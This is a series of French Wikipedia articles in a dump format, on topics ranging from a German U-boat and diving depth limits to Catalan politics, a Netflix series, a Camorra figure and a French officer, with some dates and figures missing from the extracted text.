Ollivander (boutique)



</doc>
<doc id="10576617" url="https://fr.wikipedia.org/wiki?curid=10576617" title="1412 en santé et médecine">
1412 en santé et médecine

Cet article présente les faits marquants de l'année 1412 en santé et médecine.

</doc>
<doc id="10576618" url="https://fr.wikipedia.org/wiki?curid=10576618" title="1403 en santé et médecine">
1403 en santé et médecine

Cet article présente les faits marquants de l'année 1403 en santé et médecine.

</doc>
<doc id="10576619" url="https://fr.wikipedia.org/wiki?curid=10576619" title="Unterseeboot 961">
Unterseeboot 961

L'Unterseeboot 961 ou U-961 est un sous-marin allemand (U-Boot) de type VIIC utilisé par la Kriegsmarine pendant la Seconde Guerre mondiale.
Le sous-marin fut commandé le à Hambourg (Blohm + Voss), sa quille fut posée le , il fut lancé le et mis en service le , sous le commandement du Leutnant zur See "Klaus Fischer".
L"'U-961" n'endommagea ou ne coula aucun navire au cours de l'unique patrouille (7 jours en mer) qu'il effectua.
Il fut coulé par la Royal Navy dans l'Atlantique Nord, en .
Conception.
Unterseeboot type VII, l"'U-961" avait un déplacement de en surface et en plongée. Il avait une longueur totale de , un maître-bau de , une hauteur de et un tirant d'eau de . Le sous-marin était propulsé par deux hélices de , deux moteurs diesel Germaniawerft "M6V 40/46" de en ligne de à , produisant un total de à en surface et de deux moteurs électriques Brown, Boveri &amp; Cie "GG UB 720/8" de 375 cv à 295 tr/min, produisant un total , en plongée. Le sous-marin avait une vitesse en surface de () et une vitesse de () en plongée. Immergé, il avait un rayon d'action de marins () à (; par heure) et pouvait atteindre une profondeur de . En surface son rayon d'action était de nautiques (soit ) à ().
L"U-961" était équipé de cinq tubes lance-torpilles de (quatre montés à l'avant et un à l'arrière) et embarquait quatorze torpilles. Il était équipé d'un canon de 8,8 cm SK C/35 (220 coups) et d'un canon antiaérien de Flak. Il pouvait transporter 26 mines "TMA" ou "TMB". Son équipage comprenait et .
Historique.
Il reçut sa formation de base au sein de la 5. Unterseebootsflottille jusqu'à sa perte.
Il quitte Marviken en Norvège pour sa première patrouille sous les ordres de l'Oberleutnant zur See "Klaus Fischer" le .
Après une semaine en mer, l"'U-961" opérant contre le convoi "JW-58" est détecté au radar, attaqué et coulé par des charges de profondeur du , à 150 milles marins (278 km) au nord des Îles Féroé, à la position .
Les 49 membres d'équipage meurent dans cette attaque.

</doc>
<doc id="10576625" url="https://fr.wikipedia.org/wiki?curid=10576625" title="Glenwood Springs (Colorado)">
Glenwood Springs (Colorado)



</doc>
<doc id="10576626" url="https://fr.wikipedia.org/wiki?curid=10576626" title="Profondeur maximum d'utilisation">
Profondeur maximum d'utilisation

La profondeur maximum d'utilisation ou PMU (en anglais : Maximum operating depth ou MOD - l'expression MOD est couramment utilisé par les plongeurs francophones et les ordinateurs de plongée) d'un gaz respirable est, dans les activités de plongée sous-marine telles que la plongée à saturation, la plongée technique et la plongée nitrox, la profondeur sous laquelle la pression partielle d'oxygène (Pp) du mélange de gaz dépasse une limite de sécurité.
Cette limite de sécurité est quelque peu arbitraire et varie selon l'organisme de formation du plongeur ou le code de pratique, le niveau d'effort sous-marin prévu et la durée prévue de la plongée, mais est normalement compris entre .
Le MOD est important lors de la planification des plongées utilisant des gaz comme l'héliox, nitrox et trimix parce que la proportion d'oxygène dans le mélange détermine une profondeur maximale sûre pour respirer ce gaz. Il existe un risque de toxicité aiguë en oxygène si le MOD est dépassé.
Limite sûre de pression partielle d'oxygène.
La toxicité aiguë de l'oxygène (Hyperoxie) est une réponse variable en fonction du temps de l'exposition à la pression partielle à l'historique du plongeur et est à la fois complexe et mal comprise car une pression partielle (Pp) d'oxygène supérieure à peut être mortelle (effet Paul Bert). Par ailleurs, en France, la réglementation limite la pression partielle d'oxygène à un maximum de .
Les limites d'exposition maximale recommandées dans le Manuel de plongée NOAA sont de 45 minutes à , 120 minutes à , 150 minutes à , 180 minutes à et 210 minutes à .
Formule.
Pour calculer le MOD pour une PpO2 spécifique et un pourcentage d'oxygène, on utilise la formule suivante :
formula_1
Dans laquelle PpO2 est la pression partielle maximale choisie en oxygène en bar et F est la fraction d'oxygène dans le mélange. Par exemple, si un gaz contient 36 % d'oxygène et que le maximum PpO2 choisi est de , le MOD (msw) est de .&lt;br&gt;
Notons que la formule divise simplement la pression partielle absolue de l'oxygène qui peut être tolérée (exprimée en atmosphères) par la fraction d'oxygène dans le nitrox, pour calculer la pression absolue à laquelle le mélange peut être respiré. (Par exemple, 50 % de nitrox peut être respiré à deux fois la pression de 100 % d'oxygène, donc diviser par 0,5). De cette pression totale qui peut être tolérée par le plongeur, est due à la pression de surface de l'air de la Terre, et le reste est dû à la profondeur dans l'eau. Ainsi, l'atmosphère contribuée par l'air est soustraite pour donner la pression due à la profondeur de l'eau. La pression produite par la profondeur dans l'eau, est convertie en pression en mètres d'eau de mer (msw) en multipliant par le facteur de conversion approprié.
Table MOD.
Le tableau ci-dessous montre des MOD pour une sélection de mélanges d'oxygène. La concentration approximative d'oxygène dans l'air est de 21 %.

</doc>
<doc id="10576630" url="https://fr.wikipedia.org/wiki?curid=10576630" title="José García Toledo">
José García Toledo

José Wladimir García Toledo (né le ) est un coureur cycliste vénézuélien.
Biographie.
En début d'année 2016, José García se distingue en terminant sixième du Tour du Táchira, tout en remportant l'étape reine et le classement de la montagne. Au mois de juillet, il se classe deuxième du Tour du Venezuela, derrière Yonathan Monsalve.

</doc>
<doc id="10576637" url="https://fr.wikipedia.org/wiki?curid=10576637" title="Pacte national pour le référendum">
Pacte national pour le référendum

Le Pacte national pour le référendum (en catalan "", PNR) est une réunion des partisans de l'organisation d'un référendum sur l'indépendance de la Catalogne créée en . Il rassemble notamment les forces politiques indépendantistes, dont le gouvernement de Carles Puigdemont et sa majorité parlementaire composée de Junts pel Sí et la Candidature d'unité populaire (CUP), et celles de la gauche radicale qui sont favorables à l'autodétermination, ainsi que les acteurs locaux et divers représentants de la société civile : les organisations syndicales et patronales, et les associations politiques, sociales, éducatives et culturelles.
Le Pacte national pour le référendum succède au Pacte national pour le droit de décider (PNDD), qui a réuni entre 2013 et 2015 les partisans du droit à l'autodétermination de la Catalogne pour coordonner l'organisation de la consultation du . Ses membres se réunissent pour la première fois en , à l'initiative du gouvernement, dans le but de démontrer l'existence d'un consensus politique et social en faveur d'un référendum sur l'indépendance de la Catalogne et de réclamer au gouvernement espagnol l'ouverture de négociations avec la Catalogne sur ce sujet.
Le Pacte national pour le référendum adopte en un Manifeste exprimant ses revendications. Sa commission exécutive, dirigée par l'ancien député socialiste , organise une campagne de soutien qui recueille la signature de 500 000 personnes et de 4000 organisations. Devant le refus constant du gouvernement espagnol d'ouvrir des négociations sur la tenue du référendum, le gouvernement catalan décide de l'organiser sans son accord. Le Pacte national pour le référendum est ensuite maintenu comme plateforme de débat entre partisans de l'autodétermination.
Contexte.
Le Pacte national pour le droit de décider.
Le Pacte national pour le droit de décider (PNDD), créé en à l'initiative du gouvernement d'Artur Mas, était une réunion des forces politiques et sociales favorables au droit à l'autodétermination de la Catalogne. Il réunissait les partis politiques favorables à l'autodétermination, les acteurs locaux, les associations catalanistes ou indépendantistes, les organisations syndicales, patronales et professionnelles, et les organisations sociales, éducatives et culturelles de la Catalogne. Son rôle était d'organiser la défense collective du droit à l'autodétermination et d'associer la société civile à l'action du gouvernement dans le cadre du processus souverainiste catalan.
Le PNDD a notamment contribué à préparer la consultation sur l'indépendance du . Il a été réuni plusieurs fois en 2013 et 2014, pour coordonner l'action des partisans de l'autodétermination et tenter de résoudre les divergences soulevées par l'opposition de l'État espagnol à la tenue de la consultation. Il s'est réuni pour la dernière fois en pour débattre de la convocation des élections « plébiscitaires » du 27 septembre 2015, c'est-à-dire des élections autonomiques dont l'unique enjeu était la question de l'indépendance.
Projet de référendum sur l'indépendance.
Les élections plébiscitaires du 27 septembre 2015 ont été remportées par la liste d'union indépendantiste de Junts pel Sí (JxSí). En , celle-ci a conclu un pacte de gouvernement avec la gauche radicale indépendantiste de la Candidature d'unité populaire (CUP), ce qui a permis la formation du gouvernement de Carles Puigdemont. La majorité indépendantiste a cependant connu une grave crise interne six mois plus tard, lorsque la CUP a rejeté le projet de budget pour 2016 du gouvernement. Le débat politique s'est alors porté sur l'opportunité d'un référendum unilatéral d'indépendance (RUI), qui consisterait à organiser un vote des citoyens sur l'indépendance, sans l'accord des autorités espagnoles, et dont le résultat serait contraignant. Le RUI était notamment revendiqué par la CUP. En , les deux formations indépendantistes se sont de nouveau entendues sur un programme commun révisé, qui ouvre une voie unilatérale et démocratique vers l'indépendance, à l'occasion de l'adoption des conclusions de la commission d'étude du processus constituant.
Après un nouveau vote de confiance remporté par le gouvernement en , le président Carles Puigdemont a annoncé la tenue d'un référendum sur l'indépendance, qui serait négocié avec le gouvernement espagnol, et, en l'absence de compromis, organisé sans son accord.
Résolutions parlementaires d'octobre 2016.
En , lors du débat de politique générale, le Parlement de Catalogne a adopté deux résolutions sur le référendum sur l'indépendance. La première résolution, votée par Junts pel Sí et la CUP, avec l'abstention de la gauche radicale de Catalunya Sí que es Pot (CSQP), prévoit la tenue d'un référendum contraignant, sans l'accord de l'État espagnol, au plus tard en . Il correspond à l'hypothèse du référendum unilatéral. La seconde, adoptée à l'initiative de CSQP avec l'approbation de Junts pel Sí et l'abstention de la CUP, évoque un référendum entouré de toutes les garanties juridiques et reconnu par la communauté internationale. Il correspond à l'hypothèse du référendum « pacté » avec l'État espagnol.
En préservant ces deux hypothèses, le gouvernement s'engage à rechercher d'abord un accord avec l'État espagnol, et à organiser le référendum quelle que soit l'issue des discussions. Ainsi, il s'assure un soutien partiel de la gauche radicale désignée en Catalogne sous le nom de Comuns, qui est représentée au Parlement par CSQP. Celle-ci lui est essentielle pour renforcer le camp pro-référendum dans le rapport de forces avec l'Etat espagnol, et refuse de prendre position sur l'hypothèse d'un référendum unilatéral.
La résolution sur le référendum unilatéral est contestée par le gouvernement espagnol et annulée par le Tribunal constitutionnel en . La résolution proposée par CSQP sur le référendum « pacté », reste en vigueur.
Création.
Convocation.
La résolution parlementaire sur le référendum unilatéral d' prévoit la réunion d'un sommet politique et social pour associer à l'organisation du référendum toutes les forces favorables à l'autodétermination, avec la participation de la société civile. Avant d'entamer cette étape de préparation du référendum, le gouvernement exige d'abord de la CUP qu'elle s'engage à voter en faveur de l'adoption du budget pour 2017. Cet accord est obtenu en , et le président, Carles Puigdemont, accepte de réunir le sommet sur le référendum avant la fin de l'année. La réunion est convoquée en . Les partis politiques, les organisations de la société civile et les représentants du monde économique, qui avaient participé au Pacte national pour le droit de décider de 2013 à 2015, y sont conviés pour débattre des conditions d'organisation du référendum sur l'indépendance.
L'annonce intervient dans un contexte d'accroissement de la tension politique entre le gouvernement catalan et l'État espagnol. Le gouvernement espagnol de Mariano Rajoy, renouvelé après une année de blocage politique, a annoncé une politique de dialogue pour enrayer l'indépendantisme. Il s'agit notamment de renforcer la présence du gouvernement central en Catalogne et d'y chercher des alliés. La vice-présidente du gouvernement, Soraya Sáenz de Santamaría, se rend à Barcelone où elle rencontre les dirigeants de l'opposition. Face à cette stratégie surnommée « opération dialogue », le gouvernement catalan cherche à démontrer l'existence d'un consensus politique et social pour la tenue du référendum sur l'indépendance.
Réunion constitutive.
La réunion constitutive du Pacte national pour le référendum a lieu le au Parlement. 83 personnes y participent, parmi lesquelles :
Le président Carles Puigdemont (PDECAT) défend le référendum accordé avec l'État espagnol, sans mentionner la possibilité d'un référendum unilatéral. La stratégie du gouvernement consiste à soutenir la position défendue par les Comuns, c'est-à-dire les partis de gauche qui sont favorables au référendum sans se déclarer pour l'indépendance. Les indépendantistes espèrent qu'après le refus prévisible du gouvernement espagnol, ceux-ci accepteront de soutenir un référendum unilatéral. Cette deuxième option est présentée par le vice-président du gouvernement, Oriol Junqueras (ERC), qui défend le programme du gouvernement résumé par la formule « soit un référendum, soit un référendum ». Il rappelle que le gouvernement ne renonce pas à la voie unilatérale si un accord avec l'État espagnol était impossible. La CUP, représentée par , Mireia Boya et Anna Gabriel, défend la rupture unilatérale avec l'Espagne. Enfin, la maire de Barcelone, Ada Colau, exprime son soutien à l'initiative du pacte pour le référendum, et maintient l'ambiguité de sa formation politique en ne révélant pas sa position en cas de référendum unilatéral, car les Comuns sont divisés sur cette question.
Le sommet politique et social permet au gouvernement de faire un pas de plus dans le processus indépendantiste en accumulant des soutiens. La présence d'Ada Colau, qui est la principale leader des Comuns, est un succès dans sa stratégie de constituer une majorité la plus large possible.
Le Pacte pour le référendum s'accorde pour mener une campagne de soutien au référendum négocié avec l'État espagnol. Il décide de désigner une commission exécutive pluraliste chargée de diriger son action, dont l'ancien député socialiste est nommé porte-parole. La commission exécutive est composée de huit coordinateurs proposés par le gouvernement : outre Joan Ignasi Elena, elle comprend , , Francesc de Dalmases, , , et . Elle est chargée de rédiger un manifeste en faveur du référendum, et de conduire une campagne de recueil de soutiens au référendum en Catalogne, en Espagne et dans le monde.
Campagne de soutien au référendum accordé.
Adoption du Manifeste.
La commission exécutive du Pacte national pour le référendum rédige un manifeste en faveur d'un référendum sur l'indépendance négocié avec le gouvernement espagnol. Le projet est présenté le . Il appelle les gouvernements espagnol et catalan à surmonter « les difficultés politiques et les a priori » pour parvenir à un accord sur un référendum « politiquement contraignant et effectif ». Il affirme que la Catalogne est une nation, que la majorité de ses citoyens réclament l'exercice du droit à l'autodétermination, et que la législation espagnole permet l'organisation d'un vote d'autodétermination, de sorte que son refus est une décision politique et non un constat juridique.
La deuxième réunion du Pacte national pour le référendum a lieu le au Parlement. Environ 80 représentants sont présents, dans une configuration similaire à la première réunion. Ils adoptent le Manifeste rédigé par la commission exécutive, et s'accordent pour lancer la campagne de recueil de soutiens. Le coordinateur du Pacte national pour le référendum, , présente le plan d'action pour promouvoir un référendum effectif, contraignant et reconnu : la commission exécutive va se réunir avec tous les partis politiques espagnols pour défendre le référendum sur l'indépendance, se doter un office technique pour organiser les actions, organiser des actes publics de soutien au référendum, solliciter des réunions avec les gouvernements catalan et espagnol dans le but de « provoquer le dialogue » entre eux, et transmettre le Manifeste aux municipalités catalanes pour ratification.
La réunion a lieu alors que la majorité indépendantiste est en débat sur la date du référendum, qui pourrait être organisé avant ou après l'été 2017. Le Pacte ne prend pas position sur cette question.
Campagne d'adhésion.
Le Pacte national pour le référendum organise une campagne d'adhésion qui débute le .
Elle connaît plusieurs succès rapides.
La campagne d'adhésions s'achève le par une présentation collective au à Barcelone. Cet acte festif et revendicatif est une démonstration de force, qui exprime l'aspiration souverainiste transversale de la société catalane, au moyen de pancartes, de discours et de chansons. En cinq mois de campagne, le Pacte national pour le référendum a recueilli le soutien de 500 000 personnes et de 4000 organisations. Il réclame à l'Etat espagnol l'ouverture de négociations sur la tenue du référendum sur l'indépendance.
Les membres de la commission exécutive considèrent avoir atteint leurs objectifs sur trois plans :
Maintien dans la phase unilatérale.
Dans les jours qui suivent la fin de l'action du Pacte national pour le référendum, le gouvernement catalan demande à nouveau l'ouverture de négociations lors d'une conférence sur le référendum donnée à Madrid. Le gouvernement espagnol réitère immédiatement son refus. Le président Carles Puigdemont convoque alors une réunion des partis favorables au référendum pour discuter de la poursuite du processus d'autodétermination. Les partis indépendantistes y participent ; parmi les Comuns, le nouveau parti Catalunya en Comú refuse d'y assister, tandis que Podem est représenté. Catalunya en Comú réclame la convocation du Pacte national pour le référendum ; divisé en interne, il souhaite éviter de devoir se prononcer sur la possibilité d'un référendum unilatéral. Les partis présents à la réunion s'accordent pour maintenir l'existence du Pacte national pour le référendum après l'engagement de la phase unilatérale du processus d'autodétermination, pour préserver l'unité des partisans du référendum.
Le Pacte national pour le référendum se réunit le . Ses membres actent la dissolution de la commission exécutive qui a organisé la campagne de soutien au référendum. Ils décident de maintenir le Pacte comme plateforme de débat, et de laisser au gouvernement la conduite du processus indépendantiste. Ils ne prennent pas position sur le référendum unilatéral et affirment la neutralité du Pacte vis-à-vis des décisions du gouvernement.

</doc>
<doc id="10576651" url="https://fr.wikipedia.org/wiki?curid=10576651" title="U-961">
U-961



</doc>
<doc id="10576653" url="https://fr.wikipedia.org/wiki?curid=10576653" title="Oli Rahman">
Oli Rahman

Oli Rahman ou Olli Rahman est un footballeur ghanéen né le . Il évoluait au poste de milieu de terrain.
Biographie.
En équipe nationale.
Il est médaillé de bronze avec le Ghana lors des Jeux olympiques d'été de 1992. Il dispute 2 matchs lors du tournoi olympique, inscrivant un but contre le Paraguay. 
International ghanéen, il reçoit une unique sélection en équipe du Ghana le contre le Burundi, dans le cadre des qualifications pour la Coupe du monde 1994. 
Palmarès.
"Avec Asante Kotoko :"
"Avec le Ghana :"

</doc>
<doc id="10576658" url="https://fr.wikipedia.org/wiki?curid=10576658" title="Olli Rahman">
Olli Rahman



</doc>
<doc id="10576663" url="https://fr.wikipedia.org/wiki?curid=10576663" title="Santa Clarita Diet">
Santa Clarita Diet

 est une série télévisée américaine en trente épisodes d'environ créée par Victor Fresco, diffusée entre le et le sur Netflix, incluant les pays francophones.
Synopsis.
Dans la ville de Santa Clarita, Sheila et Joel sont les heureux parents d'une jeune fille nommée Abby. Mais un jour, Sheila se transforme en zombie et doit désormais apprendre à contrôler ses pulsions meurtrières…
Production.
Développement.
Le , la plateforme Netflix annonce la commande du projet de comédie "Santa Clarita Diet" de Victor Fresco avec Drew Barrymore et Timothy Olyphant en tête d'affiche.
Le , Netflix annonce que la première saison sera disponible à partir du de l'année suivante sur sa plateforme.
Le , la série est reconduite par Netflix pour une deuxième saison. Le , la saison deux sort sur les différentes plateformes de Netflix.
Le , la série est renouvelée pour une troisième saison de dix épisodes prévue en première mondiale en 2019.
Le , Netflix annonce qu'elle met fin à la série.
Distributions des rôles.
En , lors de l'annonce de la commande de la série a été annoncé que Drew Barrymore et Timothy Olyphant rejoignent la série.
En , Ricardo Antonio Chavira obtient le rôle d'un officier et voisin de Joel (Timothy Olyphant) et Sheila (Drew Barrymore) et Skyler Gisondo celui d'Eric.
En , Liv Hewson obtient le rôle de la fille de Joel et Sheila et Mary Elizabeth Ellis celui de Lisa, une voisine des Hammond.
Le , rejoint la distribution dans le rôle récurrent d'Alondra.
Épisodes.
Deuxième saison (2018).
Elle est disponible depuis le .
Troisième saison (2019).
Elle est disponible depuis le .
Accueil.
Accueil critique.
La série a reçu des critiques généralement positives.
Le site Rotten Tomatoes souligne un et des rires fréquents, avec une note de 71 % d'avis positifs et 83 % pour les avis du public.
Metacritic lui attribue la note de 67 % et en France, sur Allociné, la note est de 4,1/5.

</doc>
<doc id="10576670" url="https://fr.wikipedia.org/wiki?curid=10576670" title="Le Monde Chico">
Le Monde Chico

Le Monde Chico est le premier album studio du duo de rap français PNL, sorti le sous le label QLF Records. L'album a été enregistré, mixé et masterisé par Nikola Feve.
Accueil critique et commercial.
De manière générale, "Le Monde Chico" est plutôt bien accueilli par la presse spécialisée. L'album est reconnu même par certains spécialistes comme un classique du rap français.
Lors de la première semaine d'exploitation, "Le Monde Chico" se vend à plus de alors que l'album est fait en indépendant. Au bout de cinq mois de commercialisation, l'album est certifié disque d'or en atteignant le cap des ventes et est aujourd'hui Diamant depuis le 19 mars 2022 avec plus de 500 000 ventes.
La chanson "Le monde ou rien" est utilisé dans le film "Le monde est à toi" de Romain Gavras en 2018.

</doc>
<doc id="10576675" url="https://fr.wikipedia.org/wiki?curid=10576675" title="Hans Schönmetzler">
Hans Schönmetzler

Hans Schönmetzler (né en 1901 en Allemagne, mort en 1947 à Berlin) est un producteur de cinéma allemand.
Biographie.
On sait peu de choses de Hans Schönmetzler. Il vient dans le monde du cinéma après la Première Guerre mondiale et commence au début des années 1920, sa carrière comme assistant réalisateur, notamment pour "Hélène de Troie" de Manfred Noa. Il devient ensuite directeur de production de 1926 jusqu'à la Seconde Guerre mondiale en 1939. L'UFA le fait producteur.

</doc>
<doc id="10576690" url="https://fr.wikipedia.org/wiki?curid=10576690" title="Through the Eyes of the Photographer">
Through the Eyes of the Photographer

 est un film biographique slovaque écrit et réalisé par Matej Mináč et sorti en 2015. Le film retrace la vie de la photographe Zuzana Mináčová et est aussi un documentaire tant sur la vie de cette personnalité que sur l'histoire de la Tchécoslovaquie.
Distribution.
Des personnalités du monde du cinéma apparaissent en images d'archive, notamment William Friedkin, Federico Fellini, ##Marcello Mastroianni, F. Murray Abraham, Mel Gibson, John Travolta, Scarlett Johansson, Antonio Banderas, Jude Law, Francis Ford Coppola, Robert De Niro, Danny DeVito, Dolores Chaplin, Morgan Freeman, Gina Lollobrigida, Keira Knightley, Lino Ventura, Michael Douglas, Robert Redford, Woody Harrelson, Robert Burton.

</doc>
<doc id="10576694" url="https://fr.wikipedia.org/wiki?curid=10576694" title="Tour de San Juan 2017">
Tour de San Juan 2017

La du Tour de San Juan a eu lieu du 23 au . La course fait partie du calendrier UCI America Tour 2017 en catégorie 2.1.
L'épreuve a été remportée par le Néerlandais Bauke Mollema (Trek-Segafredo) qui s'impose quatorze secondes devant l'Espagnol Óscar Sevilla (Medellín-Inder) et seize secondes devant le Colombien Rodolfo Torres (Androni Giocattoli).
L'Argentin Franco López (Asociación Civil Agrupación Virgen de Fátima) gagne le classement de la montagne tandis que son compatriote Nicolás Naranjo s'adjuge celui des sprints. Le Colombien Egan Bernal (Androni Giocattoli) termine meilleur jeune et la formation bahreïnienne Bahrain-Merida meilleure équipe. De plus Ricardo Escuela (Asociación Civil Agrupación Virgen de Fátima) remporte le classement du meilleur Argentin et par conséquent celui du meilleur Sanjuanino.
Présentation.
Équipes.
Classé en catégorie 2.1 de l'UCI America Tour, le Tour de San Juan est par conséquent ouvert aux WorldTeams dans la limite de 50 % des équipes participantes, aux équipes continentales professionnelles, aux équipes continentales et aux équipes nationales.
Vingt-six équipes participent à ce Tour de San Juan - quatre WorldTeams, six équipes continentales professionnelles, dix équipes continentales et six équipes nationales :

</doc>
<doc id="10576700" url="https://fr.wikipedia.org/wiki?curid=10576700" title="Rosetta Cutolo">
Rosetta Cutolo

Domenica Rosa Cutolo, dite Rosetta Cutolo (née le janvier à Ottaviano (Campanie) et morte le dans la même ville), est une mafieuse italienne.
Elle est la sœur d'un célèbre parrain de la Camorra, Raffaele Cutolo, chef de la Nuova Camorra Organizzata (NCO), une organisation fondée pour renouveler la Camorra. Comme Raffaele passait la plupart de son temps derrière les barreaux, d'où il donnait ses instructions, l'organisation quotidienne de l'entreprise revenait à sa sœur aînée Rosetta. 
Son surnom était "« Occh'egghiaccio »" (« yeux de glace »).
Biographie.
Rosetta Cutolo a vécu seule pendant des années avec sa mère à Ottaviano, près de Naples, en vendant des roses. Au même moment et pendant plus de 15 ans, elle était le bras armé de son frère, en transmettant ses ordres pendant qu'il était en prison et en motivant ses disciples dévoués. Sans elle, la NCO se serait effondrée.
Elle entretient une relation ambiguë d'amour et de haine mêlés avec son frère, qui crée le scandale en donnant des interviews et des discours en pleine salle d'audience, tandis qu'elle garde un profil bas. Selon leur avocat Paolo Trofino, leurs rapports étaient orageux : « Ils ont souvent des désaccords. Elle pense qu'il parle trop. Elle préférerait qu'il ne donne pas d'interviews »”. Elle siégeait au quartier général de la Nuova Camorra Organizzata (NCO), le , un vaste palais du comprenant 365 chambres et un grand parc avec des courts de tennis et une piscine. Le château avait été acheté pour plusieurs milliards de lires et servait de contact direct entre les Cutolo et les prisons de Poggioreale et Ascoli Piceno. Rosetta y tenait la comptabilité de l'organisation et pourvoyait assistance juridique et économique aux familles des prisonniers.
Rosetta Cutolo négociait avec les barons de la cocaïne sud-américaine, a échoué de peu à faire sauter le siège de la police et a été glamourisée dans un film, "Il Camorrista". Elle a participé, au même titre que le bras droit de Raffaele, Vincenzo Casillo, à une réunion au sommet réunissant des représentants de la Cosa nostra et les clans de la Camorra, pour tenter de mettre fin à la guerre sanglante entre la NCO et ses rivaux de la Nuova Famiglia.
Cavale.
En , la police fait irruption dans son fief alors qu'elle préside une réunion de la NCO. Rosetta Cutolo s'échappe dissimulée sous un tapis dans une voiture pilotée par le prêtre du voisinage pour passer les checkpoints. Elle n'a ensuite plus été vue en public pendant plus de 10 ans, et a dirigé les opérations cachée dans plusieurs villes différentes.
Arrestation.
En , Rosetta Cutolo se rend d'elle-même après la découverte de sa cachette par la police. Elle se présente à l'entrée du commissariat et déclare : « je suis fatiguée d'être une fugitive ». Elle avait été condamnée par contumace en 1990 à neuf ans de prison pour appartenir à la Mafia, peine réduite par la suite à cinq ans. Les procureurs ont allégué qu'elle avait dirigé l'organisation de son frère. Elle est acquittée de neuf accusations de meurtre, ayant réussi à convaincre les autorités qu'elle était inoffensive, aidée par son image de dame mal attifée.
Son frère a toujours maintenu que Rosetta ne savait rien de ses activités criminelles et qu'elle ne faisait que ce qu'il lui demandait : « Rosetta n'a jamais été une Camorrista... Elle n'a fait que m'écouter et m'envoyer quelques valises d'argent pour les prisonniers, comme je lui ai demandé. ». Néanmoins, il est clair que Cutolo a toujours voulu maintenir une organisation purement masculine, fondée sur des principes comme la fraternité des criminels. Il ne pouvait donc ouvertement confier un rôle important à sa sœur. Mais on peut aussi considérer qu'il ne voulait tout simplement pas la mettre en cause, et que c'est la raison pour laquelle il a toujours certifié qu'elle était innocente.
Rôle dans la NCO.
Plusieurs membres importants ne croient pas qu'en tant que femme Rosetta Cutolo ait pu tenir un rôle important. Par exemple, l'ancien lieutenant et pentito de la NCO, Pasquale Barra a déclaré : « Qu'est-ce que Rosa Cutolo a à voir avec ça? Qu'est-ce que les femmes ont à voir avec la Camorra? ».
Cependant, d'après le procureur Antonio Laudati qui a interrogé Raffaele Cutolo à de nombreuses reprises, sa sœur était la véritable cheffe de la NCO : « Son frère a toujours été sous la coupe de sa forte personnalité. Il est resté en prison pendant 30 ans ; pendant ce temps, elle est devenue de son propre chef la véritable dirigeante de la Nuova Camorra Organizzata ».

</doc>
<doc id="10576705" url="https://fr.wikipedia.org/wiki?curid=10576705" title="Foobar (programmation)">
Foobar (programmation)



</doc>
<doc id="10576706" url="https://fr.wikipedia.org/wiki?curid=10576706" title="Sterling (Nebraska)">
Sterling (Nebraska)

Le village américain de est situé dans le comté de Johnson, dans l’État du Nebraska. Sa population s’élevait à lors du recensement.

</doc>
<doc id="10576712" url="https://fr.wikipedia.org/wiki?curid=10576712" title="Carlo Liberati">
Carlo Liberati

Carlo Liberati, né le à Matelica (Marches, Italie), est un archevêque catholique italien, prélat de Pompéi de 2003 à 2012.
Biographie.
Formation.
En 1950, il entre au séminaire diocésain de Fabriano-Matelica. Il poursuit ses études au séminaire pontifical de Fano, où il obtient un baccalauréat en théologie en juin 1962. 
Le 12 juillet 1962, il est ordonné prêtre dans la cathédrale de Matelica par Macario Tinti.
Dès lors, il est nommé curé, professeur de littérature en séminaire, membre de l'Action catholique de la jeunesse (GIAC) et rédacteur en chef de l'hebdomadaire diocésain "Action". Il étudie ensuite la théologie pastorale à l'Université pontificale du Latran, où il obtient son diplôme en 1969. Enfin, il étudie le droit canonique, tout en travaillant comme greffier au tribunal de la Rote romaine, puis étudie à l'Académie pontificale ecclésiastique tout au long de l'année 1972.
Rôle à la Curie.
À partir du , il est nommé au sein de la Congrégation pour les causes des saints. Pendant environ vingt-deux ans, il y tient les rôles de professeur, de notaire et de rédacteur en chef des feuilles d'audition concernant les décrets sur les vertus et la conclusion des procès en béatification et en canonisation. En 1990, il contribue de manière significative à la restauration de l'église "San Salvatore in Lauro". 
Les 20 janvier 2001, le pape Jean-Paul II le nomme chef de la section ordinaire pour le patrimoine du Saint-Siège, succédant à Alfonso Badini Confalonieri.
Prélature territoriale.
Le 5 novembre 2003, le pape Jean Paul II le nomme prélat territorial de Pompei et délégué pontifical pour le sanctuaire Notre-Dame du Rosaire de Pompéi. Il est consacré le 10 janvier 2004, en la basilique Saint-Pierre, par le cardinal Angelo Sodano, assisté de et Giancarlo Vecerrica. Il est installé le 24 janvier suivant.
Le 7 juillet 2007, le pape Benoît XVI l'élève à la dignité personnelle d'archevêque. 
Le 10 novembre 2012, âgé de 75 ans, il démissionne de ses fonctions, conformément au droit canonique.
L'avenir islamique de l'Europe.
En janvier 2017, lors d'un entretien donné au site catholique "La Fede Quotidiana", Liberati affirme que : .

</doc>
<doc id="10576713" url="https://fr.wikipedia.org/wiki?curid=10576713" title="Jean Courtois (colonel)">
Jean Courtois (colonel)

Jean Courtois, né le à Longuyon (province du Barrois), mort le à Metz (Moselle), est un militaire français de la Révolution et de l’Empire.
États de service.
Il entre en service le , comme soldat au régiment du Roi-infanterie, et le , il passe dans le régiment de Hainaut, puis il reçoit son congé le .
Il reprend du service le , comme capitaine dans le bataillon de volontaires de la Moselle, avec lequel il fait les campagnes de 1792 à l’an IV aux armées de la Moselle, de Sambre-et-Meuse et du Rhin.
Le , lors du passage du Rhin, il traverse le fleuve le premier dans une barque, avec 18 hommes, force l’ennemi qui est retranché à battre en retraite, et lui fait 23 prisonniers dont un officier, avant de rejoindre les tirailleurs de l’avant-garde, pour s’emparer d’une pièce de canon et d’entrer dans Kaiserswerth. Le , il assiste à la prise d’assaut de Friedberg. Le général Jacopin lui ayant donné l’ordre de charger l’ennemi qui s’est massé dans la grande rue, il l’aborde avec résolution, le culbute, le force à se retirer et contribue à faire mettre bas les armes à 2 bataillons autrichiens. Durant cette journée, il est blessé d’un coup de boulet aux deux pieds.
En l’an V, il est employé à l’armée d’Italie, et le , au passage du Tagliamento, il prend le commandement du bataillon de sa demi-brigade, s’empare du village de Cividale, et fait un grand nombre de prisonniers. Le , lors de la prise d’assaut du , il enlève avec la compagnie de grenadiers du bataillon, le glacis de cette forteresse, et réussit à s’y établir. Il reçoit son brevet de chef de bataillon des mains du général en chef Bonaparte le .
